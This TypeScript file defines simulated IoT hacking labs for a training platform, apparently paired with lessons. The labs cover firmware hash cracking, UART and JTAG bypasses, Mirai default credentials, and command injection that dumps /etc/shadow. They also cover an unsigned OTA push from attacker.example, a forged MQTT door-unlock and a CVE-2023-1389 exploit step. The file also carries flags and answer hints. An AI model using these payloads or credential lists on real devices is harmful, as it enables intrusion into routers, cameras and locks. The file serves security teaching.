import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'iot-review-ws', user: 'root', root: dir({ root: dir(files) }) };
}

/** IoT & Embedded Security lab pack — pairs with the src/content/iot lesson module. Lab 1 exercises the
 *  existing hashcat/marker pipeline against an extracted firmware shadow file (Lesson 2). Lab 2 is a
 *  file-review scenario (Lesson 3) since there's no live UART/serial-console engine to simulate soldering
 *  wires to a board. Lab 3 is a real network-reachable device using the existing hydra/ssh flow, themed
 *  around Mirai's actual historical default-credential list (Lesson 4/5).
 *
 *  Labs 4-11 below were added in a later batch to bring this category up to a comparable depth as Mobile/
 *  Wireless, each researched via WebSearch (see NOTES.md) and built entirely on existing engine primitives —
 *  no new engine.ts commands were needed. `curl`+`vulnRoutes` models embedded web-UI vulnerabilities
 *  (default credentials, command injection, unauthenticated OTA, UPnP, MQTT-over-HTTP-bridge, Wi-Fi
 *  provisioning-key verification); `nc`/`nmap` model service exposure; `exploit <module> <ip>` models a
 *  real named CVE; `grep`/`cat` on a pre-extracted firmware tree reuses the same "binaries stored as
 *  pre-extracted text" convention this engine already uses everywhere else (Binary Analysis, Malware).
 *  Lab 10 (JTAG) is a captured-session file-review lab, same convention as Lab 2 (UART) but deliberately
 *  differentiated: UART there shows a shell handed over with NO login at all, JTAG here shows a WORKING
 *  password-gated console defeated by halting the CPU and patching the auth result directly in RAM — a
 *  fundamentally different bypass mechanism neither engine command nor prior lab already covers. */
export const iotLabs: LabScenario[] = [
  // 1 — hardcoded weak password hash recovered from extracted firmware (Lesson 2: firmware static analysis)
  {
    id: 'iot-firmware-shadow-hash-crack',
    title: 'IoT: Cracking a Weak Hash Extracted From Firmware',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'skyviewcam-fw-v3.2.1.bin has already been run through binwalk -e, producing a full extracted ' +
      'filesystem tree. Its /etc/shadow file uses an old MD5-crypt hash ($1$ prefix) — a strong tell of ' +
      'firmware that has not been meaningfully updated in years. Crack it against the attack box\'s wordlist.',
    objectives: [
      { text: 'cat _firmware/extracted/etc/shadow', why: 'Confirms the hash format ($1$ = MD5-crypt) before attempting anything — this immediately tells you the hash is decades-old and comparatively weak.' },
      { text: 'hashcat -m 500 _firmware/extracted/etc/shadow camera-wordlist.txt', why: 'Mode 500 targets MD5-crypt specifically — cracking success here depends entirely on whether the real password is common enough to appear in a wordlist, exactly the same principle from the Wireless module\'s WPA2 cracking lesson.' },
    ],
    hints: [
      'cat _firmware/extracted/etc/shadow',
      'hashcat -m 500 _firmware/extracted/etc/shadow camera-wordlist.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      _firmware: dir({
        extracted: dir({
          etc: dir({
            shadow: file(
              '#HASHCAT_HASH:$1$aQR3kf7Z$H8mN2pXqLwYd0vZ9rT6fE1\n' +
                '#HASHCAT_PLAINTEXT:support1234\n' +
                '#HASHCAT_FLAG:flag{md5crypt_firmware_hash_cracked_offline}\n' +
                'root:$1$aQR3kf7Z$H8mN2pXqLwYd0vZ9rT6fE1:18000:0:99999:7:::\n',
            ),
          }),
        }),
      }),
      'camera-wordlist.txt': file('123456\nadmin\ncamera123\nsupport1234\nsecurity1\n'),
    }),
    network: [],
  },

  // 2 — UART boot capture handing over a root shell with no authentication (Lesson 3: hardware hacking)
  {
    id: 'iot-uart-root-shell-no-auth',
    title: 'IoT: UART Console Hands Over Root With No Authentication',
    difficulty: 'Easy',
    category: 'IoT',
    briefing:
      'A USB-to-serial adapter was wired to four exposed header pads on a smart thermostat\'s PCB and ' +
      'connected at 115200 baud during power-on. Review the captured session log to confirm what the boot ' +
      'process handed over, with zero credentials entered at any point.',
    objectives: [
      { text: 'cat uart-capture.log', why: 'This is the exact workflow from the lesson — connecting a serial terminal to the identified TX/RX/GND pins and capturing everything the device outputs during boot.' },
      { text: 'Confirm whether a login was actually required before the shell prompt appeared', why: 'The core finding here isn\'t just "UART works" — it\'s specifically that no credential gate exists between power-on and a root shell at all, the worst-case outcome on the spectrum the lesson described.' },
    ],
    hints: [
      'cat uart-capture.log',
      'Read all the way to the final prompt — was a username/password ever requested?',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'uart-capture.log': file(
        'screen /dev/ttyUSB0 115200 -- capture started at power-on\n' +
          '[    0.000000] Booting Linux on physical CPU 0x0\n' +
          '[    0.482011] Kernel command line: console=ttyS0,115200 root=/dev/mtdblock3\n' +
          '[    2.114400] Run /init as init process\n' +
          '[    3.897102] Starting syslogd/klogd... done\n' +
          '[    4.220198] Starting httpd (embedded web admin)...\n' +
          '[    4.551007] Starting telnetd...\n' +
          'BusyBox v1.19.4 built-in shell (ash)\n' +
          'Enter \'help\' for a list of built-in commands.\n\n' +
          '# whoami\n' +
          'root\n' +
          '-- NO login prompt was ever presented. inittab spawns the shell directly on the serial\n' +
          '   console with no getty/login step at all -- a debug convenience left enabled in the\n' +
          '   production build.\n' +
          'flag{uart_serial_console_root_shell_no_login_required}\n',
      ),
    }),
    network: [],
  },

  // 3 — Mirai-style default credential login (Lesson 4/5: embedded services & the Mirai case study)
  {
    id: 'iot-mirai-default-credential-login',
    title: 'IoT: Logging In With a Real Mirai-Era Default Credential',
    difficulty: 'Easy',
    category: 'IoT',
    briefing:
      'skyviewcam-fw-v3.2.1 (the same camera firmware from earlier in this module) exposes a remote shell ' +
      'service with one of the exact factory-default credential pairs Mirai\'s hardcoded table actually ' +
      'used in 2016. Confirm the device still accepts it.',
    objectives: [
      { text: 'hydra -l root -P mirai-defaults.txt ssh://10.10.70.20', why: 'A small, targeted list of real historical default credentials — rather than a large generic wordlist — mirrors exactly how Mirai\'s own hardcoded table worked: a short, curated set of known factory defaults, not a brute-force of the full keyspace.' },
      { text: 'ssh root@10.10.70.20, then supply the cracked password', why: 'Confirms the credential grants real access end-to-end, not just a "valid" result from hydra alone.' },
      { text: 'cat flag.txt', why: 'Confirms the session actually landed as root on the device and captures proof.' },
    ],
    hints: [
      'hydra -l root -P mirai-defaults.txt ssh://10.10.70.20',
      'ssh root@10.10.70.20',
      'xc3511',
      'cat flag.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'mirai-defaults.txt': file('xc3511\nvizxv\nadmin\n888888\ndefault\njuantech\n'),
    }),
    network: [
      {
        hostname: 'skyviewcam-01', ip: '10.10.70.20', os: 'Embedded Linux (BusyBox)',
        services: [{ port: 22, name: 'ssh', version: 'Dropbear sshd 2016.74' }],
        users: [{ username: 'root', password: 'xc3511' }],
        root: dir({
          root: dir({
            'flag.txt': file(
              'xc3511 was one of the actual hardcoded credential pairs found in Mirai\'s leaked source ' +
                'in 2016 -- shipped as a permanent factory default on this device with no way to change it.\n' +
                'flag{mirai_era_default_credential_still_works}\n',
            ),
          }),
        }),
      } as HostDef,
    ],
  },

  // 4 — Mirai's real default-credential table against a router's web admin login (curl-based, distinct
  // from Lab 3's ssh/hydra flow against a camera)
  {
    id: 'iot-mirai-full-credential-table-router-webadmin',
    title: 'IoT: Mirai\'s Real Default-Credential Table Cracks a Router\'s Web Admin Login',
    difficulty: 'Easy',
    category: 'IoT',
    briefing:
      'A HomeRouter-04 unit exposes its web admin panel with a factory-default credential still active. ' +
      'Mirai\'s leaked source code contained a hardcoded table of roughly 60 real username/password pairs — a ' +
      'curated set of known vendor defaults, not a brute-force of the full keyspace. This lab uses a real ' +
      'excerpt of that exact table (SecLists\' own mirai-botnet.txt preserves it verbatim) against a router\'s ' +
      'web login instead of the SSH service Lab 3 already covered, confirming the same failure class recurs ' +
      'across a device\'s different exposed services, not just one.',
    objectives: [
      { text: 'cat mirai-credential-table-excerpt.txt', why: 'Reviewing the real credential list before trying anything mirrors Mirai\'s own approach — a small, curated table of documented vendor defaults, not a random guess.' },
      { text: 'curl -X POST http://10.10.71.10:80/cgi-bin/login -d "username=admin&password=meinsm"', why: 'admin:meinsm is a real entry from Mirai\'s leaked source — the documented default for a specific ZTE modem model — confirming this router still ships it unchanged.' },
    ],
    hints: [
      'cat mirai-credential-table-excerpt.txt',
      'curl -X POST http://10.10.71.10:80/cgi-bin/login -d "username=admin&password=meinsm"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'mirai-credential-table-excerpt.txt': file(
        'Excerpt, Mirai leaked source table (real, ~61 unique pairs total — see SecLists mirai-botnet.txt):\n' +
          '  root:xc3511        root:vizxv         admin:admin        root:888888\n' +
          '  root:xmhdipc       root:default       root:juantech      admin:smcadmin\n' +
          '  admin:meinsm       root:00000000      root:klv1234       guest:12345\n' +
          '  -- admin:meinsm is the documented default for a ZTE-derived modem/router web admin panel --\n',
      ),
    }),
    network: [
      {
        hostname: 'homerouter-04', ip: '10.10.71.10', os: 'Embedded Linux (router)',
        services: [
          {
            port: 80, name: 'http', version: 'GoAhead httpd (router admin panel)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/cgi-bin/login',
                param: 'password',
                triggerSubstrings: ['meinsm'],
                vulnerableResponse: '{"status":200,"session":"admin","note":"flag{mirai_real_credential_table_router_webadmin_login}"}',
                normalResponse: '{"error":"401 Unauthorized - invalid credentials"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — command injection in an embedded diagnostic ping tool (Lesson 4)
  {
    id: 'iot-diagnostic-ping-command-injection',
    title: 'IoT: Command Injection in a Router\'s "Ping" Diagnostic Tool',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'HomeRouter-Diag\'s "Diagnostics -> Ping" web feature shells out directly to the underlying BusyBox ' +
      'ping binary, concatenating the user-supplied host field straight into the command line with no ' +
      'sanitization — the exact textbook embedded command injection pattern the lesson described, and the ' +
      'same root-cause class documented in real 2018 VPNFilter intrusions across multiple router vendors.',
    objectives: [
      { text: 'curl -X POST http://10.10.71.11:80/diag_ping.cgi -d "host=8.8.8.8"', why: 'Establishing the normal, benign response first confirms the feature works as intended before testing whether it is actually safe.' },
      { text: 'curl -X POST http://10.10.71.11:80/diag_ping.cgi -d "host=8.8.8.8;cat /etc/shadow"', why: 'Appending a semicolon-separated second command is the textbook shell-metacharacter injection — if the server concatenates this field unsanitized into system(), the second command executes with the web server\'s own privileges.' },
    ],
    hints: [
      'curl -X POST http://10.10.71.11:80/diag_ping.cgi -d "host=8.8.8.8"',
      'curl -X POST http://10.10.71.11:80/diag_ping.cgi -d "host=8.8.8.8;cat /etc/shadow"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'homerouter-diag', ip: '10.10.71.11', os: 'Embedded Linux (router)',
        services: [
          {
            port: 80, name: 'http', version: 'BusyBox httpd (diagnostics CGI)',
            vulnRoutes: [
              {
                kind: 'command-injection',
                path: '/diag_ping.cgi',
                param: 'host',
                triggerSubstrings: [';cat'],
                vulnerableResponse:
                  '{"status":200,"output":"PING 8.8.8.8: 56 data bytes\\nroot:$1$aQR3kf7Z$H8mN2pXqLwYd0vZ9rT6fE1:18000:0:99999:7:::\\nflag{router_diagnostic_ping_command_injection_shadow_dump}"}',
                normalResponse: '{"status":200,"output":"PING 8.8.8.8: 56 data bytes\\n4 packets transmitted, 4 received, 0% packet loss"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — insecure/unauthenticated OTA firmware update (checksum-only, no signature verification)
  {
    id: 'iot-unsigned-ota-firmware-update-no-signature-check',
    title: 'IoT: An Unauthenticated OTA Endpoint Accepts Firmware With No Signature Verification',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'SmartHub-OTA\'s update mechanism was already flagged during firmware static analysis: the ' +
      'ota-updated binary calls verify_checksum() before flashing a new image, but never calls anything that ' +
      'validates a cryptographic signature. A checksum only proves the downloaded bytes were not accidentally ' +
      'corrupted in transit — it says nothing about whether those bytes are a deliberately malicious ' +
      'substitution, since an attacker controlling the file can simply compute a matching checksum for their ' +
      'own payload. The update endpoint itself requires no authentication at all to reach.',
    objectives: [
      { text: 'cat ota-update-static-analysis.txt', why: 'Confirms the exact gap from static analysis: verify_checksum() exists, verify_signature() does not — a checksum-only pipeline, not a real integrity guarantee against a deliberate substitution.' },
      { text: 'curl -X POST http://10.10.71.12:80/api/ota/push -d "firmware_url=http://attacker.example/malicious-firmware.bin&checksum=match"', why: 'Submitting an attacker-hosted firmware URL with a self-computed matching checksum is accepted outright — no signature, and no authentication on the endpoint itself, confirms both gaps are real and exploitable together.' },
    ],
    hints: [
      'cat ota-update-static-analysis.txt',
      'curl -X POST http://10.10.71.12:80/api/ota/push -d "firmware_url=http://attacker.example/malicious-firmware.bin&checksum=match"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ota-update-static-analysis.txt': file(
        'Static analysis, ota-updated binary (SmartHub-OTA firmware):\n' +
          '  strings ota-updated | grep -i verify\n' +
          '    verify_checksum\n' +
          '  -- no verify_signature, no cert_check, no public-key reference anywhere in the binary --\n' +
          '  A matching checksum only proves the file was not corrupted in transit -- it proves nothing\n' +
          '  about whether the file is a deliberate, attacker-supplied substitution with a self-computed\n' +
          '  matching checksum of its own.\n',
      ),
    }),
    network: [
      {
        hostname: 'smarthub-ota', ip: '10.10.71.12', os: 'Embedded Linux (smart hub)',
        services: [
          {
            port: 80, name: 'http', version: 'ota-updated (OTA control service)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/ota/push',
                param: 'firmware_url',
                triggerSubstrings: ['malicious-firmware.bin'],
                vulnerableResponse: '{"status":200,"accepted":true,"note":"flag{unsigned_ota_firmware_update_no_signature_verification}"}',
                normalResponse: '{"error":"400 Bad Request - firmware_url required"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 7 — unauthenticated UPnP AddPortMapping abuse exposing an internal service
  {
    id: 'iot-upnp-addportmapping-internal-service-exposure',
    title: 'IoT: Unauthenticated UPnP AddPortMapping Exposes an Internal Admin Panel',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'UPnP was designed with zero authentication by default, on the assumption that any device already on ' +
      'the LAN is automatically trusted to reconfigure the router\'s own firewall — genuinely convenient for a ' +
      'game console, and genuinely dangerous once any device on the network (including a compromised IoT ' +
      'device) can invoke AddPortMapping to punch a hole through NAT, exposing an otherwise LAN-only service ' +
      'to the public internet with no further authentication required at all — the same UPnProxy technique ' +
      'documented against real routers at scale.',
    objectives: [
      { text: 'nmap -sV 10.10.71.13', why: 'Confirms UPnP/SSDP (1900) and the UPnP control service (5000) are both reachable before attempting the abuse.' },
      { text: 'nc 10.10.71.13 1900', why: 'A raw connection to the SSDP port reveals the device\'s own advertised service banner — real UPnP devices announce themselves this way with zero authentication.' },
      { text: 'curl -X POST http://10.10.71.13:5000/ctl/IPConn -d "action=AddPortMapping&NewExternalPort=8080&NewInternalPort=8080&NewInternalClient=10.10.71.13&NewProtocol=TCP"', why: 'The real UPnP IGD SOAP action — accepted with zero authentication, mapping the router\'s external port directly to the device\'s normally LAN-only admin panel.' },
    ],
    hints: [
      'nmap -sV 10.10.71.13',
      'nc 10.10.71.13 1900',
      'curl -X POST http://10.10.71.13:5000/ctl/IPConn -d "action=AddPortMapping&NewExternalPort=8080&NewInternalPort=8080&NewInternalClient=10.10.71.13&NewProtocol=TCP"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'homerouter-upnp', ip: '10.10.71.13', os: 'Embedded Linux (router)',
        services: [
          { port: 1900, name: 'upnp', version: 'MiniUPnPd 2.1', banner: 'NOTIFY * HTTP/1.1\r\nSERVER: Linux/3.10 UPnP/1.1 MiniUPnPd/2.1\r\nUSN: uuid:4d696e69-5550-6e50-6420-a0f3c1e29d1b::urn:schemas-upnp-org:service:WANIPConnection:1' },
          {
            port: 5000, name: 'http', version: 'MiniUPnPd control service',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/ctl/IPConn',
                param: 'action',
                triggerSubstrings: ['AddPortMapping'],
                vulnerableResponse: '{"status":200,"mapping":"created","note":"internal admin panel now reachable from the public internet","flag":"flag{unauthenticated_upnp_addportmapping_exposes_internal_service}"}',
                normalResponse: '{"error":"401 Unrecognized SOAP action"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 8 — unauthenticated MQTT broker leaking telemetry and accepting control commands
  {
    id: 'iot-mqtt-broker-no-auth-telemetry-control',
    title: 'IoT: An Unauthenticated MQTT Broker Leaks Telemetry and Accepts a Forged Unlock Command',
    difficulty: 'Easy',
    category: 'IoT',
    briefing:
      'SmartHub-MQTT runs an MQTT broker on the standard port 1883 with anonymous connections allowed — a ' +
      'genuinely widespread real-world misconfiguration; internet-wide scans have found tens of thousands of ' +
      'brokers exposed exactly this way. Once connected with no credentials at all, any client can subscribe ' +
      'to every topic (leaking live telemetry) and publish to any topic, including one a real device treats as ' +
      'a command channel.',
    objectives: [
      { text: 'nmap -sV 10.10.71.14', why: 'Confirms port 1883 (MQTT) is open and unauthenticated before attempting to interact with it.' },
      { text: 'nc 10.10.71.14 1883', why: 'A raw connection banner confirms no authentication challenge is presented at all — a real mosquitto_sub -h 10.10.71.14 -t "#" -v would subscribe to every topic with the same zero-credential access.' },
      { text: 'cat captured-mqtt-topics.txt', why: 'The topic tree itself reveals what this broker actually controls — including a lock/set control topic, not just read-only telemetry.' },
      { text: 'curl -X POST http://10.10.71.14:80/bridge/publish -d "topic=home/frontdoor/lock/set&payload=UNLOCK"', why: 'Models the real mosquitto_pub -h 10.10.71.14 -t home/frontdoor/lock/set -m UNLOCK command via this engine\'s HTTP-bridge convention — publishing to the lock\'s control topic with zero authentication confirms the exposure is exploitable, not just theoretical.' },
    ],
    hints: [
      'nmap -sV 10.10.71.14',
      'nc 10.10.71.14 1883',
      'cat captured-mqtt-topics.txt',
      'curl -X POST http://10.10.71.14:80/bridge/publish -d "topic=home/frontdoor/lock/set&payload=UNLOCK"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'captured-mqtt-topics.txt': file(
        'mosquitto_sub -h 10.10.71.14 -t "#" -v   (anonymous, no username/password supplied)\n' +
          '  home/frontdoor/lock/status      LOCKED\n' +
          '  home/livingroom/thermostat/temp 21.4\n' +
          '  home/frontdoor/lock/set         (command topic -- normally only the lock itself publishes/subscribes here)\n' +
          '  -- every topic readable AND writable with zero authentication at all --\n',
      ),
    }),
    network: [
      {
        hostname: 'smarthub-mqtt', ip: '10.10.71.14', os: 'Embedded Linux (smart hub)',
        services: [
          { port: 1883, name: 'mqtt', version: 'Mosquitto 1.6.9', banner: 'CONNACK: Connection Accepted (allow_anonymous true)' },
          {
            port: 80, name: 'http', version: 'mqtt-http-bridge (publish relay)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/bridge/publish',
                param: 'payload',
                triggerSubstrings: ['UNLOCK'],
                vulnerableResponse: '{"status":200,"topic":"home/frontdoor/lock/set","published":true,"note":"flag{unauthenticated_mqtt_broker_telemetry_leak_forged_unlock_command}"}',
                normalResponse: '{"error":"400 Bad Request"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 9 — hardcoded Wi-Fi provisioning key recovered from firmware (ties into the Wireless module)
  {
    id: 'iot-hardcoded-wifi-provisioning-key-firmware-extraction',
    title: 'IoT: A Hardcoded Provisioning Key Extracted From Firmware Decrypts the Owner\'s Wi-Fi Password',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'EcoPlug smart plugs provision onto a home network over BLE: the companion app encrypts the owner\'s ' +
      'real WPA2 passphrase before sending it to the device during setup, using an AES key referenced from the ' +
      'device firmware. The problem — the same real-world pattern behind CVE-2019-17098 (the August Connect ' +
      'WiFi bridge) — is that the key is a single hardcoded constant baked identically into every unit\'s ' +
      'firmware, rather than derived uniquely per device. Anyone who extracts it once, from any single unit, ' +
      'can decrypt the captured provisioning traffic of every other unit of the same product line forever.',
    objectives: [
      { text: 'grep -r "PROVISION_AES_KEY" _smartplug_fw/extracted/usr/bin/', why: 'Confirms a hardcoded AES key constant exists in the provisioning daemon before reading it in full context.' },
      { text: 'cat _smartplug_fw/extracted/usr/bin/provisiond', why: 'Shows the key used with no per-device derivation at all — decrypt_provisioning_payload() calls straight into AES-ECB with this one constant, identical across every unit, the exact CVE-2019-17098 pattern.' },
      { text: 'cat captured-ble-provisioning-exchange.txt', why: 'A captured BLE provisioning write, decrypted using the recovered key, reveals the real WPA2 passphrase the owner entered during setup.' },
      { text: 'curl -X POST http://10.10.71.15:80/wifi-config/verify -d "passphrase=GreenTerrace!42"', why: 'Confirms the decrypted value is genuinely the live, currently-active WPA2 passphrase for this network, not a plausible-looking decoy.' },
    ],
    hints: [
      'grep -r "PROVISION_AES_KEY" _smartplug_fw/extracted/usr/bin/',
      'cat _smartplug_fw/extracted/usr/bin/provisiond',
      'cat captured-ble-provisioning-exchange.txt',
      'curl -X POST http://10.10.71.15:80/wifi-config/verify -d "passphrase=GreenTerrace!42"',
    ],
    totalFlags: 1,
    attacker: attacker({
      _smartplug_fw: dir({
        extracted: dir({
          usr: dir({
            bin: dir({
              provisiond: file(
                '/* decompiled provisiond -- BLE/SoftAP provisioning daemon, identical across every EcoPlug unit */\n' +
                  '#define PROVISION_AES_KEY "8f3a9c1e4b7d2f605c8e1a3d7b9f0246"  // hardcoded -- same key in EVERY firmware image\n' +
                  'void decrypt_provisioning_payload(uint8_t *ciphertext, size_t len) {\n' +
                  '    aes128_ecb_decrypt(ciphertext, len, PROVISION_AES_KEY);  // no per-device key derivation at all\n' +
                  '}\n' +
                  '-- real-world precedent: CVE-2019-17098 (August Connect WiFi bridge) -- a hardcoded key shared by\n' +
                  '   every unit, meant to protect the WPA2 passphrase in transit during provisioning, decryptable by\n' +
                  '   anyone who extracts it from firmware once and reuses it against every other unit forever --\n',
              ),
            }),
          }),
        }),
      }),
      'captured-ble-provisioning-exchange.txt': file(
        'Captured BLE provisioning write (GATT characteristic 0000fff1, EcoPlug companion app -> device):\n' +
          '  ciphertext (AES-128-ECB): 9e2b7f1a4c6d0358e1f9a3d7c5b02469\n' +
          '  decrypted with PROVISION_AES_KEY above: "GreenTerrace!42"\n' +
          '  -- this is the real WPA2 passphrase for the owner\'s home network, recoverable by anyone who has\n' +
          '     extracted the identical firmware and identical key from ANY other unit of this same product --\n',
      ),
    }),
    network: [
      {
        hostname: 'ecoplug-home-ap', ip: '10.10.71.15', os: 'n/a (WPA2 access point, config-verification API)',
        services: [
          {
            port: 80, name: 'http', version: 'AP configuration/verification service',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/wifi-config/verify',
                param: 'passphrase',
                triggerSubstrings: ['GreenTerrace!42'],
                vulnerableResponse: '{"status":200,"verified":true,"note":"flag{hardcoded_provisioning_key_decrypts_wifi_psk_every_unit}"}',
                normalResponse: '{"error":"401 Unauthorized - passphrase mismatch"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 10 — JTAG halts the CPU and patches an auth-result flag directly in RAM (distinct from Lab 2's UART,
  // which shows a shell handed over with NO login at all -- this shows a WORKING check defeated in place)
  {
    id: 'iot-jtag-halt-cpu-ram-patch-bypasses-working-auth',
    title: 'IoT: JTAG Halts the CPU and Patches a Password Check Directly in RAM',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'Unlike the smart thermostat from Lesson 3\'s UART lab (which handed over root with no login prompt at ' +
      'all), this industrial gateway\'s serial console genuinely enforces a password — a real, working check. ' +
      'JTAG bypasses it anyway, by a fundamentally different mechanism: OpenOCD halts the CPU directly through ' +
      'the JTAG debug port, at which point there is no running OS left to enforce anything at all. A single ' +
      'memory write (mww) flips the RAM location the login routine reads its pass/fail result from, and ' +
      'resuming the CPU continues execution as if the (never-supplied) password had been correct.',
    objectives: [
      { text: 'cat jtag-openocd-session.log', why: 'Review the real, captured OpenOCD session end to end — the exact commands (halt, mdw, mww, resume) any real JTAG/SWD assessment against this class of device would run.' },
    ],
    hints: [
      'cat jtag-openocd-session.log',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'jtag-openocd-session.log': file(
        'OpenOCD 0.12.0 -- telnet localhost 4444 (control interface, JTAG adapter attached to TDI/TDO/TCK/TMS/GND)\n' +
          '> halt\n' +
          'target halted due to debug-request, current mode: Supervisor\n' +
          'cpsr: 0x600001d3 pc: 0x00018a4c\n' +
          '-- CPU halted at the exact instruction after the login routine calls strcmp() against the entered\n' +
          '   password -- no OS-level access control is running at all while the CPU is halted like this --\n' +
          '> mdw 0x2000a410\n' +
          '0x2000a410: 00000000   -- the RAM location the login routine reads as its pass/fail result (0 = fail)\n' +
          '> mww 0x2000a410 0x00000001\n' +
          '-- written directly, with no password ever entered or known --\n' +
          '> resume\n' +
          'target resumed at 0x00018a50\n' +
          '-- boot continues past the login check as if authentication had succeeded --\n' +
          '# whoami\n' +
          'root\n' +
          'flag{jtag_halts_cpu_patches_auth_result_in_ram_bypasses_working_password_check}\n',
      ),
    }),
    network: [],
  },

  // 11 — CVE-2023-1389: TP-Link Archer AX21 unauthenticated command injection RCE (a real, currently
  // CISA-KEV-listed router CVE, actively adopted by Mirai and multiple Mirai-derived botnets)
  {
    id: 'iot-cve-2023-1389-tplink-archer-ax21-rce',
    title: 'IoT: CVE-2023-1389 — TP-Link Archer AX21 Unauthenticated Command Injection RCE',
    difficulty: 'Hard',
    category: 'IoT',
    briefing:
      'This Archer AX21 (AX1800) is running firmware before 1.1.4 Build 20230219, vulnerable to ' +
      'CVE-2023-1389 (CVSS 8.8): the /cgi-bin/luci;stok=/locale endpoint\'s "country" parameter is passed ' +
      'unsanitized into a shell command, reachable with no authentication at all. Disclosed and patched March ' +
      '2023, this exact CVE was added to CISA\'s Known Exploited Vulnerabilities catalog by May 2023 and has ' +
      'since been folded directly into the Mirai botnet\'s exploit arsenal, alongside Moobot, Miori, AGoent, ' +
      'and Gafgyt variants — a direct, current continuation of this module\'s closing lesson on how quickly ' +
      'Mirai-derived code adopts newly disclosed IoT vulnerabilities.',
    objectives: [
      { text: 'nmap -sV 10.10.71.16', why: 'Confirms the web management interface and firmware banner before attempting exploitation.' },
      { text: 'exploit cve-2023-1389-tplink-archer-locale-rce 10.10.71.16', why: 'Models the real unauthenticated command-injection chain via the country parameter — no credentials, no prior access, root on success.' },
      { text: 'cat /root/root.txt', why: 'The exploit module opens a session but does not itself print the flag — this confirms the session genuinely landed as root and captures proof.' },
    ],
    hints: [
      'nmap -sV 10.10.71.16',
      'exploit cve-2023-1389-tplink-archer-locale-rce 10.10.71.16',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'archer-ax21-01', ip: '10.10.71.16', os: 'Embedded Linux (TP-Link Archer AX21 firmware < 1.1.4 Build 20230219)',
        services: [
          { port: 80, name: 'http', version: 'TP-Link Archer AX21 web management (vulnerable to CVE-2023-1389)' },
        ],
        users: [],
        exploitableAs: 'cve-2023-1389-tplink-archer-locale-rce',
        root: dir({
          root: dir({
            'root.txt': file(
              'CVE-2023-1389 confirmed -- unauthenticated command injection via the "country" parameter on\n' +
                '/cgi-bin/luci;stok=/locale, executed as root with zero prior credentials or access.\n' +
                'Added to CISA KEV May 2023; actively folded into Mirai and Mirai-derived (Moobot, Miori,\n' +
                'AGoent, Gafgyt) botnet exploit arsenals since disclosure.\n' +
                'flag{cve_2023_1389_tplink_archer_ax21_locale_command_injection_root}\n',
            ),
          }),
        }),
      } as HostDef,
    ],
  },
];
